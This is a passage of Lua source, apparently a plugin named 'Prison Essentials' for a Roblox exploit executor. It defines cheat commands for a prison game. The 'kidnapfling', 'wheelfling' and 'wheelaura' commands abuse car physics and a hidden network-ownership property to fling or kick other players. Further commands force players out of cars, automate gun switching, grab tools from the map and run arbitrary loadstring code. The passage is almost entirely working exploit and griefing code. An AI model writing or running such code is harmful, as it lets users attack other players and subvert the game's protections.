			["ListName"] = "disablekillaura",
			["Description"] = "Disables killaura",
			["Aliases"] = {"unkillaura"},
			["Function"] = function(args, speaker)
				killAuraEnabled = false
			end,
		},

		["kidnapfling"] = {
			["ListName"] = "kidnapfling [plr] [speed]",
			["Description"] = "Kidnapflings the target player",
			["Aliases"] = {},
			["Function"] = function(args, speaker)
				local car = getCar()
				if not car then notify("Prison Essentials:", "Could not locate your car. Please get a car.") return end
				local carSeat = car.Body:FindFirstChild("VehicleSeat")

				local players = getPlayer(args[1], speaker)
				local targetName = players[1]
				if not targetName then notify("Prison Essentials:", "Could not find a player matching that name.") return end
				local target = Players:FindFirstChild(targetName)

				local targetChar = target.Character
				if not targetChar then notify("Prison Essentials:", "Target player has no character loaded or is currently dead.") return end

				local targetHrp = targetChar:FindFirstChild("HumanoidRootPart")
				if not targetHrp then notify("Prison Essentials:", "Target's RootPart is missing. They may be voided or loading.") return end

				local targetHumanoid = targetChar:FindFirstChild("Humanoid")
				if not targetHumanoid then notify("Prison Essentials:", "Target's humanoid is missing. They may be loading.") return end

				if targetHumanoid.SeatPart then notify("Prison Essentials:", "Target is sitting. They can't be flung.") return end

				local wheelOffsets = {}

				for i, v in ipairs(car.Wheels:GetChildren()) do
					table.insert(wheelOffsets, {v, carSeat.CFrame:Inverse() * v.CFrame})
				end

				local function updateWheels()
					for i, v in ipairs(wheelOffsets) do
						v[1].CFrame = carSeat.CFrame * v[2]
						v[1].AssemblyLinearVelocity = Vector3.zero
						v[1].AssemblyAngularVelocity = Vector3.zero
					end
				end

				local offsetIndex = 1
				local switchIndex = 0
				activeKidnapFlingCar = car

				while targetChar.Parent and car.Parent do
					RunService.PostSimulation:Wait()
					updateWheels()
					if targetHumanoid.SeatPart and targetHumanoid.SeatPart:IsDescendantOf(car) then execCmd("passengerfling") break end
					local targetCframe = targetHrp.CFrame * carKidnapOffsets[offsetIndex]

					switchIndex = (switchIndex + 1) % switchModulo
					if switchIndex == 0 then
						offsetIndex = offsetIndex + 1
						if offsetIndex > #carKidnapOffsets then
							offsetIndex = 1
						end
						if sethiddenproperty then
							sethiddenproperty(carSeat, "PhysicsRepRootPart", targetHrp)
						end
						carSeat.CFrame = targetCframe
						updateWheels()
					else
						if sethiddenproperty then
							sethiddenproperty(carSeat, "PhysicsRepRootPart", nil)
						end
						carSeat.CFrame = farCFrame
					end
				end
			end,
		},

		["hidetools"] = {
			["ListName"] = "hidetools",
			["Description"] = "Hides your tools",
			["Aliases"] = {"htools", "invisibletools", "invistools"},
			["Function"] = function(args, speaker)
				hidetoolsEnabled = true
				while hidetoolsEnabled do
					task.wait()
					for i, v in speaker.Backpack:GetChildren() do
						if v:IsA("Tool") then
							v.Grip = CFrame.new(0, -4000, 0)
							for ii, vv in ipairs(v:GetDescendants()) do
								if vv:IsA("BasePart") then
									vv.Massless = true
									vv.RootPriority = -1
								end
							end
						end
					end
				end
			end,
		},

		["unhidetools"] = {
			["ListName"] = "unhidetools",
			["Description"] = "Unhides your tools",
			["Aliases"] = {"unhtools"},
			["Function"] = function(args, speaker)
				hidetoolsEnabled = false
				local character = speaker.Character
				if not character then notify("Prison Essentials:", "Could not locate your Character model. Please respawn.") return end
				for i, v in character:GetChildren() do
					if v:IsA("Tool") then
						v.Grip = CFrame.new(0, 0, 0)
					end
				end
				for i, v in speaker.Backpack:GetChildren() do
					if v:IsA("Tool") then
						v.Grip = CFrame.new(0, 0, 0)
					end
				end
			end,
		},

		["wheelfling"] = {
			["ListName"] = "wheelfling [player] [power] [ping]",
			["Description"] = "Tries to fling the target player",
			["Aliases"] = {"wfling"},
			["Function"] = function(args, speaker)
				local character = speaker.Character
				if not character then notify("Prison Essentials:", "Could not locate your Character model. Please respawn.") return end

				local humanoid = character:FindFirstChild("Humanoid")
				if not humanoid then notify("Prison Essentials:", "Humanoid is missing. Try resetting.") return end

				local carSeat = humanoid.SeatPart
				local isDriving = carSeat and carSeat:IsA("VehicleSeat")
				if not isDriving then notify("Prison Essentials:", "You must be in the driver's seat to perform a Wheel Fling.") return end
				local car = carSeat.Parent.Parent
				local oldCFrame = carSeat.CFrame

				local players = getPlayer(args[1], speaker)
				local targetName = players[1]
				if not targetName then notify("Prison Essentials:", "Could not find a player matching that name.") return end
				local target = Players:FindFirstChild(targetName)

				local newFlingSpeed = args[2]
				if newFlingSpeed then
					carFlingSpeed = newFlingSpeed * 1000
				--else
				--	carFlingSpeed = 1000
				--	notify("Standard Velocity", "No power specified. Using default thrust (1,000).")
				end

				local targetChar = target.Character
				if not targetChar then notify("Prison Essentials:", "Target player has no character loaded or is currently dead.") return end

				local targetHrp = targetChar:FindFirstChild("HumanoidRootPart")
				if not targetHrp then notify("Prison Essentials:", "Target's RootPart is missing. They may be voided or loading.") return end
				local targetHumanoid = targetChar:FindFirstChild("Humanoid")
				if not targetHumanoid then notify("Prison Essentials:", "Target's humanoid is missing. They may be loading.") return end
			
				local currentCons = {}
				local originalWheelOffsets = {}
				local wheels = car.Wheels:GetChildren()
				local cleanedup = false

				for i, v in ipairs(car.Wheels:GetChildren()) do
					table.insert(originalWheelOffsets, {v, carSeat.CFrame:Inverse() * v.CFrame})
				end

				local function returnOriginalWheels()
					for i, v in ipairs(originalWheelOffsets) do
						v[1].CFrame = carSeat.CFrame * v[2]
						v[1].AssemblyLinearVelocity = Vector3.zero
						v[1].AssemblyAngularVelocity = Vector3.zero
					end
				end

				local function updatePosition()
					carSeat.CFrame = oldCFrame
					carSeat.AssemblyLinearVelocity = Vector3.zero
					carSeat.AssemblyAngularVelocity = Vector3.zero
				end

				local function cleanup()
					if cleanedup then return end
					cleanedup = true
					notify("Prison Essentials:", "Target launched. Resetting vehicle position and velocity.")
					if not target.Parent then
						task.wait(6)
						notify("Prison Essentials:", "Target " .. target.Name .. " has been succesfuly kicked!")
					end
					for _, connection in currentCons do
						connection:Disconnect()
					end
					currentCons = {}
					
					for i = 1, 60 do
						RunService.PreSimulation:Wait()
						for i, v in ipairs(wheels) do
							v.CanCollide = true
							if sethiddenproperty then
								sethiddenproperty(v, "PhysicsRepRootPart", nil)
							end
						end
						carSeat.CFrame = oldCFrame
						carSeat.AssemblyLinearVelocity = Vector3.zero
						carSeat.AssemblyAngularVelocity = Vector3.zero
						updatePosition()
						returnOriginalWheels()
					end
				end

				local function preStep()
					if cleanedup then return end
					if not targetChar.Parent or not car.Parent or not targetHumanoid or targetHumanoid.Health <= 0 then
						cleanup()
						return
					end

					local dir = -(targetHrp.Position - Vector3.new(-238, 80, 1836)).Unit

					for i, w in wheels do
						w.CanCollide = false
						local targetPart = targetChar:FindFirstChild(wheelFlingTargets[i] or "HumanoidRootPart")
						if not targetPart then continue end
						local targetPos = targetPart.Position
						if sethiddenproperty then
							sethiddenproperty(w, "PhysicsRepRootPart", targetPart)
						end
						w.Position = targetPos
						w.AssemblyLinearVelocity = (carFlingSpeed * dir)
						w.AssemblyAngularVelocity = Vector3.zero
					end
				end

				table.insert(currentCons, RunService.PreSimulation:Connect(function()
					preStep()
				end))

				table.insert(currentCons, RunService.PostSimulation:Connect(function()
					preStep()
					updatePosition()
				end))
				
				table.insert(currentCons, humanoid:GetPropertyChangedSignal("SeatPart"):Connect(function()
					if not humanoid.SeatPart then
						cleanup()
					end
				end))

				table.insert(currentCons, humanoid:GetPropertyChangedSignal("Health"):Connect(function()
					if humanoid.Health <= 0 then
						cleanup()
					end
				end))

				table.insert(currentCons, targetHumanoid:GetPropertyChangedSignal("Health"):Connect(function()
					if targetHumanoid.Health <= 0 then
						cleanup()
					end
				end))
				
				table.insert(currentCons, car.Destroying:Connect(function()
					cleanup()
				end))

				table.insert(currentCons, target.Destroying:Connect(function()
					cleanup()
				end))

				table.insert(currentCons, target.CharacterRemoving:Connect(function()
					cleanup()
				end))

				table.insert(currentCons, targetHrp.Destroying:Connect(function()
					cleanup()
				end))

				task.delay(10, cleanup)
			end,
		},

		["wheelaura"] = {
			["ListName"] = "wheelaura [range]",
			["Description"] = "Wheel aura",
			["Aliases"] = {"enablewheelaura"},
			["Function"] = function(args, speaker)
				local newFlingSpeed = args[2]
				if newFlingSpeed then
					carFlingSpeed = newFlingSpeed * 1000
				--else
				--	carFlingSpeed = 1000
				--	notify("Standard Velocity", "No power specified. Using default thrust (1,000).")
				end

				local newWheelAuraOffset = args[4]
				if newWheelAuraOffset then
					wheelauraOffset = newWheelAuraOffset
				end

				local newWheelauraSpeed = args[5]
				if newWheelauraSpeed then
					wheelauraSpeed = newWheelauraSpeed
				end

				local character = speaker.Character
				if not character then notify("Prison Essentials:", "Could not locate your Character model. Please respawn.") return end

				local humanoid = character:FindFirstChild("Humanoid")
				if not humanoid then notify("Prison Essentials:", "Humanoid is missing. Try resetting.") return end

				local carSeat = humanoid.SeatPart
				local isDriving = carSeat and carSeat:IsA("VehicleSeat")
				if not isDriving then notify("Prison Essentials:", "You must be in the driver's seat to perform a Wheel Fling.") return end
				local car = carSeat.Parent.Parent

				local players = getPlayer(args[1], speaker)
				local targetName = players[1]
				if not targetName then notify("Prison Essentials:", "Could not find a player matching that name.") return end
				local target = Players:FindFirstChild(targetName)

				local oldCFrame = carSeat.CFrame

				local currentCons = {}
				local originalWheelOffsets = {}

				local wheels = car.Wheels:GetChildren()

				local elapsed = 0

				local cleanedup = false

				for i, v in ipairs(wheels) do
					table.insert(originalWheelOffsets, {v, carSeat.CFrame:Inverse() * v.CFrame})
				end

				local function returnOriginalWheels()
					for i, v in ipairs(originalWheelOffsets) do
						v[1].CFrame = carSeat.CFrame * v[2]
						v[1].AssemblyLinearVelocity = Vector3.zero
						v[1].AssemblyAngularVelocity = Vector3.zero
					end
				end

				local function updatePosition()
					carSeat.CFrame = oldCFrame
					carSeat.AssemblyLinearVelocity = Vector3.zero
					carSeat.AssemblyAngularVelocity = Vector3.zero
				end

				local function cleanup()
					if cleanedup then return end
					cleanedup = true
					notify("Prison Essentials:", "Target launched. Resetting vehicle position and velocity.")
					if not target.Parent then
						task.wait(6)
						notify("Prison Essentials:", "Target " .. target.Name .. " has been succesfuly kicked!")
					end
					for _, connection in ipairs(currentCons) do
						connection:Disconnect()
					end
					currentCons = {}
					
					for _ = 1, 60 do
						RunService.PreSimulation:Wait()
						for _, v in ipairs(wheels) do
							v.CanCollide = true
							if sethiddenproperty then
								sethiddenproperty(v, "PhysicsRepRootPart", nil)
							end
						end
						updatePosition()
						returnOriginalWheels()
					end
				end

				local function preStep(dt)
					local targetChar = target.Character
					if not targetChar then return end
					local targetHrp = targetChar:FindFirstChild("HumanoidRootPart")
					if not targetHrp then return end

					local dir  = -(targetHrp.Position - Vector3.new(-238, 80, 1836)).Unit

					for i, w in ipairs(wheels) do
						w.CanCollide = false
						local xOffset, zOffset = math.sin(elapsed + (i * (2 * math.pi / #wheels))) * wheelauraOffset * 2, math.cos(elapsed + (i * (2 * math.pi / #wheels))) * wheelauraOffset * 2
						local targetPos = targetHrp.Position + Vector3.new(xOffset, 0, zOffset)
						if sethiddenproperty then
							sethiddenproperty(w, "PhysicsRepRootPart", targetHrp)
						end
						w.Position = targetPos
						w.AssemblyLinearVelocity = (carFlingSpeed * dir)
						w.AssemblyAngularVelocity = Vector3.zero
					end
				end

				table.insert(currentCons, RunService.PreSimulation:Connect(function(dt)
                    elapsed = elapsed + dt * wheelauraSpeed
					preStep(dt)
				end))

                table.insert(currentCons, RunService.RenderStepped:Connect(function(dt)
                    preStep(dt)
                end))

				table.insert(currentCons, RunService.PostSimulation:Connect(function(dt)
					preStep(dt)
					updatePosition()
				end))

				table.insert(currentCons, humanoid:GetPropertyChangedSignal("SeatPart"):Connect(function()
					if not humanoid.SeatPart then
						cleanup()
					end
				end))
			end,
		},

		["crash"] = {
			["ListName"] = "crash",
			["Description"] = "Crashes your client",
			["Aliases"] = {},
			["Function"] = function(args, speaker)
				table.clear(getreg())
			end,
		},

		["anticarfling"] = {
			["ListName"] = "anticarfling",
			["Description"] = "Disables car flinging",
			["Aliases"] = {"disablecarfling"},
			["Function"] = function(args, speaker)
				antiCarFlingEnabled = true
				local carContainer = workspace:WaitForChild("CarContainer")

				local function processCar(car)
					if not antiCarFlingEnabled then return end
					
					local body = car:WaitForChild("Body", 5)
					if not body then return end
					
					task.wait(.2)
					if not antiCarFlingEnabled then return end

					local carParts = {}
					
					for _, v in ipairs(body:GetDescendants()) do
						if v:IsA("BasePart") then
							if v.CanCollide then
								carParts[v] = true
								v.CanCollide = false
							end
						end
					end
				end

				for _, car in ipairs(carContainer:GetChildren()) do
					task.spawn(processCar, car)
				end

				carContainer.ChildAdded:Connect(function(car)
					task.spawn(processCar, car)
				end)
			end,
		},

		["disableanticarfling"] = {
			["ListName"] = "disableanticarfling",
			["Description"] = "Disables anti car flinging",
			["Aliases"] = {"unanticarfling"},
			["Function"] = function(args, speaker)
				antiCarFlingEnabled = false
				for i, car in ipairs(cars) do
					if car.Parent then
						for ii, v in ipairs(car.Body:GetDescendants()) do
							if v:IsA("BasePart") then
								v.CanCollide = true
							end
						end
					end
				end
				table.clear(cars)
				table.clear(carParts)
			end,
		},

		["gettool"] = {
			["ListName"] = "gettool [tool]",
			["Description"] = "Gets a tool from the map",
			["Aliases"] = {"getarmor", "getgun", "getitem"},
			["Function"] = function(args, speaker)
				if speaker.Team.Name == "Neutral" then 
					notify("Prison Essentials:", "You must be on a team to use this command.") 
					return 
				end
				if not args[1] then 
					notify("Prison Essentials:", "Please specify a tool name.") 
					return 
				end

				fetchTools({args[1]}, speaker)
			end,
		},

		["gettoolcombo"] = {
			["ListName"] = "gettoolcombo [tool1] [tool2]...",
			["Description"] = "Gets multiple tools from the map in one fast sequence",
			["Aliases"] = {"getarmorcombo", "getguncombo", "getitemcombo", "gtc", "getcombo"},
			["Function"] = function(args, speaker)
				if speaker.Team.Name == "Neutral" then 
					notify("Prison Essentials:", "You must be on a team to use this command.") 
					return 
				end
				if #args == 0 then return end

				fetchTools(args, speaker)
			end,
		},

		["smartdiedtp"] = {
			["ListName"] = "smartdiedtp",
			["Description"] = "Teleports you to the last safe position",
			["Aliases"] = {"sdtp"},
			["Function"] = function(args, speaker)
				if not lastDeathCFrame then
					notify("Prison Essentials:", "No saved death position found!")
					return
				end

				local character = speaker.Character
				if not character or not character:FindFirstChild("HumanoidRootPart") then
					notify("Prison Essentials:", "Could not locate your character.")
					return
				end

				safeTp = true

				local rayOrigin = lastDeathCFrame.Position
				if speaker.Team and speaker.Team.Name == "Criminals" then
					local prisonRegion = ReplicatedStorage:WaitForChild("Regions"):WaitForChild("Prison")
					rayOrigin = keepVectorOutsideRegion(rayOrigin, prisonRegion.CFrame, prisonRegion.Size)
				end

				local safePos = nil
				local groundRay = workspace:Raycast(rayOrigin, Vector3.new(0, -500, 0))

				if groundRay then
					safePos = groundRay.Position + Vector3.new(0, 5.5, 0)
				else
					local ceilingRay = workspace:Raycast(rayOrigin, Vector3.new(0, 500, 0))
					if ceilingRay then
						safePos = ceilingRay.Position + Vector3.new(0, 10.5, 0) 
					else
						safePos = rayOrigin
					end
				end

				local rx, ry, rz = lastDeathCFrame:ToOrientation()
				character:PivotTo(CFrame.new(safePos) * CFrame.Angles(rx, ry, rz))
				RunService.Heartbeat:Wait()
				safeTp = false
			end,
		},

		["savecurrentposition"] = {
			["ListName"] = "savecurrentposition",
			["Description"] = "Saves position by vector coordinates, waypoint name, or character position",
			["Aliases"] = {"scp"},
			["Function"] = function(args, speaker)
				local targetCFrame = nil

				local isNil = getstring(1, args) == "nil" or getstring(1, args) == "null"
				if isNil then
					lastDeathCFrame = nil
					notify("Prison Essentials:", "Saved position cleared.")
					return
				end

				local function getCFrameFromWP(wp)
					if not wp then return nil end

					if wp.COORD and type(wp.COORD) == "table" then
						return CFrame.new(wp.COORD[1], wp.COORD[2], wp.COORD[3])
					elseif wp.COORDS and type(wp.COORDS) == "table" then
						return CFrame.new(wp.COORDS[1], wp.COORDS[2], wp.COORDS[3])
					elseif typeof(wp.CFrame) == "CFrame" then
						return wp.CFrame
					elseif typeof(wp.Position) == "Vector3" then
						return CFrame.new(wp.Position)
					end

					return nil
				end

				local x = tonumber(args[1])
				local y = tonumber(args[2])
				local z = tonumber(args[3])

				local player = getPlayer(args[1], speaker)[1]

				if x and y and z then
					targetCFrame = CFrame.new(x, y, z)
				elseif player then
					local targetCharacter = Players:FindFirstChild(player).Character
					if targetCharacter then
						local targetHrp = targetCharacter:FindFirstChild("HumanoidRootPart")
						if targetHrp then
							targetCFrame = targetHrp.CFrame
						end
					end
				else
					local waypointName = getstring(1, args)
					if waypointName and waypointName ~= "" then
						local tablesToCheck = {}
						if AllWaypoints then table.insert(tablesToCheck, AllWaypoints) end
						if WayPoints then table.insert(tablesToCheck, WayPoints) end
						if pWayPoints then table.insert(tablesToCheck, pWayPoints) end

						for _, wpTable in ipairs(tablesToCheck) do
							for name, wp in pairs(wpTable) do
								local actualName = type(wp) == "table" and wp.NAME or (type(name) == "string" and name)
								if actualName and actualName:lower() == waypointName:lower() then
									targetCFrame = getCFrameFromWP(wp)
									if targetCFrame then break end
								end
							end
							if targetCFrame then break end
						end
					end
				end

				if not targetCFrame then
					local character = speaker.Character
					if not character then 
						notify("Prison Essentials:", "Could not locate your Character model. Please respawn.") 
						return 
					end
					local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
					if not humanoidRootPart then 
						notify("Prison Essentials:", "HumanoidRootPart is missing. Try resetting.") 
						return 
					end
					targetCFrame = humanoidRootPart.CFrame
				end

				lastDeathCFrame = targetCFrame
				notify("Prison Essentials:", "Saved position successfully.")
			end,
		},

		["gunmacro"] = {
			["ListName"] = "gunmacro",
			["Description"] = "Enables gun macro",
			["Aliases"] = {"enablegunmacro"},
			["Function"] = function(args, speaker)
				gunMacroEnabled = true

				local newGunMacroSwitchDelayMs = tonumber(args[1])
				if newGunMacroSwitchDelayMs then
					gunMacroSwitchDelayMs = newGunMacroSwitchDelayMs
				end

				while gunMacroEnabled do
					task.wait()
					if not gunMacroEnabled then break end

					local character = speaker.Character
					if not character then continue end

					local humanoid = character:FindFirstChildOfClass("Humanoid")
					if not humanoid or humanoid.Health <= 0 then continue end

					local guns = getAllGuns()
					if #guns == 0 then continue end

					local delta = tick() - lastGunMacroSwitchTime
					if delta >= (gunMacroSwitchDelayMs / 1000) then
						lastGunMacroSwitchTime = tick()
						
						gunMacroIndex = gunMacroIndex + 1
						if gunMacroIndex > #guns then
							gunMacroIndex = 1
						end
						
						local gun = guns[gunMacroIndex]
						if gun then
							humanoid:UnequipTools()
							humanoid:EquipTool(gun)
						end
					end
				end
			end,
		},

		["disablegunmacro"] = {
			["ListName"] = "disablegunmacro",
			["Description"] = "Disables gun macro",
			["Aliases"] = {"disablegunmacro"},
			["Function"] = function(args, speaker)
				gunMacroEnabled = false
			end,
		},

		["stopblacklistedanims"] = {
			["ListName"] = "stopblacklistedanims",
			["Description"] = "Stops blacklisted animations from playing",
			["Aliases"] = {"stopblackanims", "stopblacklistedanimations"},
			["Function"] = function(args, speaker)
				stopBlacklistedAnimsEnabled = true
			end,
		},

		["unstopblacklistedanims"] = {
			["ListName"] = "unstopblacklistedanims",
			["Description"] = "Allows blacklisted animations to play again",
			["Aliases"] = {"unstopblackanims", "unstopblacklistedanimations"},
			["Function"] = function(args, speaker)
				stopBlacklistedAnimsEnabled = false
			end,
		},

		["kick"] = {
			["ListName"] = "kick [plr]",
			["Description"] = "Kicks target",
			["Aliases"] = {},
			["Function"] = function(args, speaker)
				local character = speaker.Character
				if not character then notify("Prison Essentials:", "Could not locate your Character model. Please respawn.") return end

				local humanoid = character:FindFirstChild("Humanoid")
				if not humanoid then notify("Prison Essentials:", "Humanoid is missing. Try resetting.") return end

				local players = getPlayer(args[1], speaker)
				local targetName = players[1]
				if not targetName then notify("Prison Essentials:", "Could not find a player matching that name.") return end
				local target = Players:FindFirstChild(targetName)
				local targetChar = target.Character
				if not targetChar then notify("Prison Essentials:", "Target has no character") return end
				local targetHumanoid = targetChar:FindFirstChild("Humanoid")
				if not targetHumanoid and targetHumanoid.Health > 0 and not targetHumanoid.SeatPart then notify("Prison Essentials:", "Target has no humanoid, isn't sitting or is dead") return end
				local isCar = targetHumanoid.SeatPart.Name == "VehicleSeat" and targetHumanoid.SeatPart.Parent.Name == "Body"
				if not isCar then return end
				local car = targetHumanoid.SeatPart.Parent.Parent
				local seats = {}
				for i, v in car.Body:GetChildren() do
					if v:IsA("Seat") and not v.Occupant then
						table.insert(seats, v)
					end
				end

				if humanoid.SeatPart then
					humanoid.Jump = true
				end

				if #seats < 0 then return end
				seats[1]:Sit(humanoid)
				local animation = Instance.new("Animation")
   				animation.AnimationId = "rbxassetid://148840371"
				humanoid:LoadAnimation(animation):Play()
				ReplicatedStorage.Remotes.RequestTeamChange:InvokeServer(game.Teams.Neutral, 1)
			end,
		},

		["storecar"] = {
			["ListName"] = "storecar",
			["Description"] = "Stores the car you are currently driving",
			["Aliases"] = {"storevehicle"},
			["Function"] = function(args, speaker)
				local character = speaker.Character
				if not character then notify("Prison Essentials:", "Could not locate your Character model. Please respawn.") return end

				local humanoid = character:FindFirstChild("Humanoid")
				if not humanoid then notify("Prison Essentials:", "Humanoid is missing. Try resetting.") return end

				local carSeat = humanoid.SeatPart
				local isDriving = carSeat and carSeat:IsA("VehicleSeat")
				if not isDriving then notify("Prison Essentials:", "You must be in the driver's seat to store a vehicle.") return end
				local car = carSeat.Parent.Parent

				local oldCFrame = carSeat.CFrame
				while humanoid.Health > 0 and character.Parent and car.Parent and humanoid.SeatPart do
					RunService.PostSimulation:Wait()
					carSeat.CFrame = oldCFrame * CFrame.new(0, 200, 0)
				end

				for i, v in car.Wheels:GetChildren() do
					v.CFrame = farCFrame
				end

				table.insert(storedCars, {car = car, Using = false})

				for i, v in ipairs(car.Body:GetDescendants()) do
					if v:IsA("BasePart") then
						v.CustomPhysicalProperties = PhysicalProperties.new(100, 1, 1, 1, 1)
						v.CanCollide = false
					end
				end

				local cons = {}

				table.insert(cons, car.Destroying:Connect(function()
					for _, connection in ipairs(cons) do
						connection:Disconnect()
					end
					--table.remove(storedCars, table.find(storedCars, function(v) return v.car == car end))
				end))
			end,
		},

		["antitase"] = {
			["ListName"] = "antitase",
			["Description"] = "Enables anti-tase",
			["Aliases"] = {"enableantitase"},
			["Function"] = function(args, speaker)
				antiTaseEnabled = true
				updateAntiTase()
			end,
		},

		["unantitase"] = {
			["ListName"] = "unantitase",
			["Description"] = "Disables anti-tase",
			["Aliases"] = {"disableantitase"},
			["Function"] = function(args, speaker)
				antiTaseEnabled = false
				updateAntiTase()
			end,
		},

		["updateantitase"] = {
			["ListName"] = "updateantitase",
			["Description"] = "Updates anti-tase",
			["Aliases"] = {},
			["Function"] = function(args, speaker)
				updateAntiTase()
			end,
		},

		["bruteforceantifling"] = {
			["ListName"] = "bruteforceantifling",
			["Description"] = "Bruteforces anti-fling",
			["Aliases"] = {"baf"},
			["Function"] = function(args, speaker)
				local character = speaker.Character or speaker.CharacterAdded:Wait()
				local humanoid = character:WaitForChild("Humanoid")
				local head = character:WaitForChild("Head")
				lastPos = nil
				speaker.CharacterAdded:Connect(function(char)
					character = char
					humanoid = character:WaitForChild("Humanoid")
					head = character:WaitForChild("Head")
					lastPos = nil
				end)
				bruteForceAntiFlingEnabled = true
				RunService.PreSimulation:Connect(function()
					if not bruteForceAntiFlingEnabled then return end
					if not head then return end
					lastPos = head.Position
				end)
				RunService.PostSimulation:Connect(function(dt)
					if not bruteForceAntiFlingEnabled then return end
					if safeTp then return end
					if not lastPos then return end
					if humanoid:GetState() == Enum.HumanoidStateType.Seated then return end
					local currentPos = head.Position
					local delta = (currentPos - lastPos).Magnitude / dt
					if delta > 1500 then
						execCmd("rj")
						speaker:Kick("Brute force anti-fling detected a fling. Rejoining...")
					end
				end)
			end,
		},

		["unbruteforceantifling"] = {
			["ListName"] = "unbruteforceantifling",
			["Description"] = "Disables bruteforce anti-fling",
			["Aliases"] = {"unbaf"},
			["Function"] = function(args, speaker)
				bruteForceAntiFlingEnabled = false
			end,
		},

		["execute"] = {
			["ListName"] = "execute [script]",
			["Description"] = "Executes a script",
			["Aliases"] = {"exec"},
			["Function"] = function(args, speaker)
				local source = table.concat(args, " ")
				if not source or source == "" then notify("Prison Essentials:", "Please provide a script to execute.") return end
				local func = loadstring(source)
				if not func then notify("Prison Essentials:", "Failed to load script.") return end
				func()
			end,
		}
	},
}

return Plugin
